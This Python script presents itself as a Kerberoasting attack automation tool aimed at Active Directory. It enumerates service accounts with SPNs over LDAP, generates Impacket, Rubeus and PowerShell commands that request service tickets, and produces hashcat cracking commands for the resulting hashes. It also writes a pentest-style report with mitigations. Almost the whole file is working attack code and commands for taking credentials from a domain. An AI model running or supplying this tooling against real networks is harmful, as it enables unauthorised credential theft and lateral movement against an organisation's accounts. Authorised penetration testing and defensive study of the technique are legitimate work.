#!/usr/bin/env python3
"""
Kerberoasting Attack Automation Tool

Automates Kerberoasting workflow including:
- SPN enumeration via LDAP
- TGS ticket request and extraction
- Hash formatting for offline cracking
- Cracking result analysis and reporting

Usage:
    python process.py --domain targetdomain.local --dc-ip 10.0.0.1 --username user --password Pass123 --enumerate
    python process.py --domain targetdomain.local --dc-ip 10.0.0.1 --username user --password Pass123 --kerberoast
    python process.py --analyze-hashes kerberoast_hashes.txt --cracked cracked.txt --output report.md

Requirements:
    pip install impacket ldap3 rich
"""

import argparse
import json
import sys
from datetime import datetime
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
except ImportError:
    print("[!] Missing dependencies. Install with: pip install rich")
    sys.exit(1)

console = Console()


def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str, use_hash: bool = False) -> list[dict]:
    """Enumerate domain accounts with SPNs set via LDAP."""
    accounts = []

    try:
        import ldap3
        from ldap3 import Server, Connection, SUBTREE, ALL

        # Build LDAP connection
        server = Server(dc_ip, get_info=ALL, use_ssl=False)

        # Build DN from domain
        domain_dn = ",".join([f"DC={part}" for part in domain.split(".")])

        if use_hash:
            # NTLM authentication with hash
            conn = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=ldap3.NTLM,
            )
        else:
            conn = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=ldap3.NTLM,
            )

        if not conn.bind():
            console.print(f"[red][-] LDAP bind failed: {conn.last_error}[/red]")
            return accounts

        console.print(f"[green][+] Connected to {dc_ip} as {domain}\\{username}[/green]")

        # Search for user accounts with SPNs
        search_filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        conn.search(
            search_base=domain_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=[
                "sAMAccountName",
                "servicePrincipalName",
                "memberOf",
                "adminCount",
                "pwdLastSet",
                "lastLogon",
                "description",
                "distinguishedName",
                "userAccountControl",
            ],
        )

        for entry in conn.entries:
            account = {
                "samaccountname": str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else "",
                "spn": [str(spn) for spn in entry.servicePrincipalName] if hasattr(entry, "servicePrincipalName") else [],
                "memberof": [str(g) for g in entry.memberOf] if hasattr(entry, "memberOf") else [],
                "admincount": str(entry.adminCount) if hasattr(entry, "adminCount") else "0",
                "pwdlastset": str(entry.pwdLastSet) if hasattr(entry, "pwdLastSet") else "",
                "lastlogon": str(entry.lastLogon) if hasattr(entry, "lastLogon") else "",
                "description": str(entry.description) if hasattr(entry, "description") else "",
                "dn": str(entry.distinguishedName) if hasattr(entry, "distinguishedName") else "",
            }
            accounts.append(account)

        conn.unbind()

    except ImportError:
        console.print("[yellow][!] ldap3 not installed. Install with: pip install ldap3[/yellow]")
        console.print("[yellow][!] Falling back to demonstration mode...[/yellow]")
    except Exception as e:
        console.print(f"[red][-] LDAP enumeration failed: {e}[/red]")

    return accounts


def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, target_users: list[str] | None = None) -> str:
    """Request TGS tickets for SPN accounts using Impacket."""
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
        from impacket import version
        import impacket.krb5.asn1

        console.print("[yellow][*] Requesting TGS tickets via Impacket...[/yellow]")
        console.print(f"[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
        console.print(f"[cyan]impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt[/cyan]")

        return f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt"

    except ImportError:
        console.print("[yellow][!] Impacket not installed. Generating command for manual execution.[/yellow]")

        commands = []
        # Generate Impacket command
        commands.append(f"# Impacket GetUserSPNs (Linux)")
        commands.append(f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt")
        commands.append("")

        # Generate Rubeus command
        commands.append("# Rubeus (Windows)")
        commands.append(f".\\Rubeus.exe kerberoast /domain:{domain} /dc:{dc_ip} /outfile:kerberoast.txt")
        commands.append("")

        # Generate PowerShell command
        commands.append("# PowerShell native")
        commands.append("Add-Type -AssemblyName System.IdentityModel")
        if target_users:
            for user in target_users:
                commands.append(f'# New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{user}"')

        return "\n".join(commands)


def generate_hashcat_commands(hash_file: str) -> list[str]:
    """Generate hashcat commands for cracking Kerberoast hashes."""
    commands = [
        f"# RC4 (etype 23) - Most common",
        f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        "",
        f"# AES-128 (etype 17)",
        f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
        "",
        f"# AES-256 (etype 18)",
        f"hashcat -m 19800 {hash_file} /usr/share/wordlists/rockyou.txt",
        "",
        f"# Mask attack for common patterns (Season+Year+Special)",
        f"hashcat -m 13100 {hash_file} -a 3 '?u?l?l?l?l?l?d?d?d?d?s'",
        "",
        f"# Combined wordlist + rules",
        f"hashcat -m 13100 {hash_file} wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule",
        "",
        f"# Show cracked passwords",
        f"hashcat -m 13100 {hash_file} --show",
    ]
    return commands


def analyze_hash_file(hash_file: str) -> dict:
    """Analyze Kerberoast hash file for statistics."""
    stats = {
        "total_hashes": 0,
        "rc4_hashes": 0,
        "aes128_hashes": 0,
        "aes256_hashes": 0,
        "accounts": [],
    }

    try:
        with open(hash_file, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue

                stats["total_hashes"] += 1

                # Parse hashcat format: $krb5tgs$23$*user$domain$spn*$hash
                if "$krb5tgs$23$" in line:
                    stats["rc4_hashes"] += 1
                elif "$krb5tgs$17$" in line:
                    stats["aes128_hashes"] += 1
                elif "$krb5tgs$18$" in line:
                    stats["aes256_hashes"] += 1

                # Extract account name
                parts = line.split("$")
                for i, part in enumerate(parts):
                    if part.startswith("*"):
                        account = part.strip("*")
                        stats["accounts"].append(account)
                        break

    except FileNotFoundError:
        console.print(f"[red][-] Hash file not found: {hash_file}[/red]")
    except Exception as e:
        console.print(f"[red][-] Error analyzing hashes: {e}[/red]")

    return stats


def generate_report(accounts: list[dict], hash_stats: dict | None, cracked: list[dict] | None, output_path: str):
    """Generate Kerberoasting assessment report."""
    report = f"""# Kerberoasting Assessment Report
## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---

## 1. Executive Summary

Kerberoasting assessment identified **{len(accounts)}** domain accounts with Service Principal Names (SPNs) configured. These accounts are vulnerable to offline password cracking attacks that can be performed by any authenticated domain user.

## 2. Enumerated SPN Accounts

| Account | Admin Count | SPNs | Password Last Set | Description |
|---------|-------------|------|-------------------|-------------|
"""

    for acc in accounts:
        spns = ", ".join(acc.get("spn", [])[:2])
        report += f"| {acc['samaccountname']} | {acc.get('admincount', 'N/A')} | {spns} | {acc.get('pwdlastset', 'N/A')} | {acc.get('description', '')[:30]} |\n"

    if hash_stats:
        report += f"""
## 3. Hash Analysis

| Metric | Value |
|--------|-------|
| Total Hashes | {hash_stats['total_hashes']} |
| RC4 (etype 23) | {hash_stats['rc4_hashes']} |
| AES-128 (etype 17) | {hash_stats['aes128_hashes']} |
| AES-256 (etype 18) | {hash_stats['aes256_hashes']} |
"""

    if cracked:
        report += f"""
## 4. Cracked Credentials

| Account | Password Strength | Admin | Impact |
|---------|-------------------|-------|--------|
"""
        for c in cracked:
            report += f"| {c.get('account', 'N/A')} | {c.get('strength', 'N/A')} | {c.get('admin', 'N/A')} | {c.get('impact', 'N/A')} |\n"

    report += """
## 5. Recommendations

### Immediate Actions
1. Change passwords for all Kerberoastable accounts to 25+ character random strings
2. Convert service accounts to Group Managed Service Accounts (gMSA) where possible
3. Remove unnecessary SPNs from user accounts

### Long-Term Mitigations
1. Enforce AES-only Kerberos encryption (disable RC4)
2. Implement Fine-Grained Password Policies for service accounts
3. Deploy honeypot SPN accounts with detection alerting
4. Regular auditing of accounts with SPNs
5. Monitor Event ID 4769 for anomalous TGS requests

## 6. MITRE ATT&CK Mapping

| Technique | ID | Status |
|-----------|----|--------|
| Kerberoasting | T1558.003 | Executed |
| Account Discovery | T1087.002 | Executed |
| Permission Groups Discovery | T1069.002 | Executed |
"""

    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w") as f:
        f.write(report)

    console.print(f"[green][+] Report saved to: {output_path}[/green]")


def main():
    parser = argparse.ArgumentParser(description="Kerberoasting Attack Automation Tool")
    parser.add_argument("--domain", help="Target domain")
    parser.add_argument("--dc-ip", help="Domain Controller IP")
    parser.add_argument("--username", help="Domain username")
    parser.add_argument("--password", help="Password or NTLM hash")
    parser.add_argument("--enumerate", action="store_true", help="Enumerate SPN accounts")
    parser.add_argument("--kerberoast", action="store_true", help="Request TGS tickets")
    parser.add_argument("--analyze-hashes", help="Path to hash file to analyze")
    parser.add_argument("--cracked", help="Path to cracked results file")
    parser.add_argument("--output", default="./kerberoast_report.md", help="Output path")
    parser.add_argument("--generate-commands", action="store_true", help="Generate hashcat commands")

    args = parser.parse_args()
    accounts = []

    if args.enumerate:
        if not all([args.domain, args.dc_ip, args.username, args.password]):
            console.print("[red][-] --domain, --dc-ip, --username, --password required[/red]")
            return

        console.print(f"[yellow][*] Enumerating SPN accounts in {args.domain}...[/yellow]")
        accounts = enumerate_spn_accounts(args.domain, args.dc_ip, args.username, args.password)

        if accounts:
            table = Table(title=f"Kerberoastable Accounts in {args.domain}")
            table.add_column("Account", style="red bold")
            table.add_column("Admin", style="yellow")
            table.add_column("SPNs", style="cyan")
            table.add_column("Pwd Last Set", style="green")

            for acc in accounts:
                table.add_row(
                    acc["samaccountname"],
                    str(acc.get("admincount", "N/A")),
                    str(len(acc.get("spn", []))),
                    acc.get("pwdlastset", "N/A")[:20],
                )
            console.print(table)
        else:
            console.print("[yellow][!] No Kerberoastable accounts found (or enumeration failed)[/yellow]")

    if args.kerberoast:
        if not all([args.domain, args.dc_ip, args.username, args.password]):
            console.print("[red][-] --domain, --dc-ip, --username, --password required[/red]")
            return

        commands = request_tgs_tickets(args.domain, args.dc_ip, args.username, args.password)
        console.print(Panel(commands, title="Kerberoasting Commands"))

    if args.analyze_hashes:
        stats = analyze_hash_file(args.analyze_hashes)
        table = Table(title="Hash Analysis")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        table.add_row("Total Hashes", str(stats["total_hashes"]))
        table.add_row("RC4 (etype 23)", str(stats["rc4_hashes"]))
        table.add_row("AES-128 (etype 17)", str(stats["aes128_hashes"]))
        table.add_row("AES-256 (etype 18)", str(stats["aes256_hashes"]))
        console.print(table)

    if args.generate_commands:
        hash_file = args.analyze_hashes or "kerberoast.txt"
        commands = generate_hashcat_commands(hash_file)
        console.print(Panel("\n".join(commands), title="Hashcat Cracking Commands"))

    # Generate report if we have data
    if accounts or args.analyze_hashes:
        hash_stats = analyze_hash_file(args.analyze_hashes) if args.analyze_hashes else None
        generate_report(accounts, hash_stats, None, args.output)


if __name__ == "__main__":
    main()
